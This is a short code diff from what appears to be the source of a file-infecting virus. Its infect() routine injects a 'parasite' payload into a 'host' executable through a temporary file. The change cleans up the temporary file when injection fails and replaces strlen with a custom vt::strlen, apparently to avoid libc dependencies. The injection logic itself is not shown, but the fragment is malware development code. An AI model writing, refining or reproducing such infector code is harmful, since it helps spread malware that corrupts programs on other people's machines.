@@ -38,7 +38,9 @@ common::FileDescriptor infect(std::span<const std::byte> host_mapping,
   if (!infector.inject(std::span<std::byte>(output_host_mapping.mutable_base(),
                                             output_host_mapping.size()),
                        parasite_mapping)) {
-    return common::FileDescriptor{};
+    // infection failed, close and remove the temprorary file.
+    output = {};
+    (void)vt::unlink(tmp_file_name);
   }
   return output;
 }
@@ -84,7 +86,7 @@ bool infect(const char* host_path, const char* parasite_path) {
                                            parasite.handle(), 0);
 
   char tmp[PATH_MAX];
-  auto len = strlen(host_path);
+  auto len = vt::strlen(host_path);
   vt::strcpy(tmp, host_path);
   tmp[len] = '.';
   tmp[len + 1] = '\0';
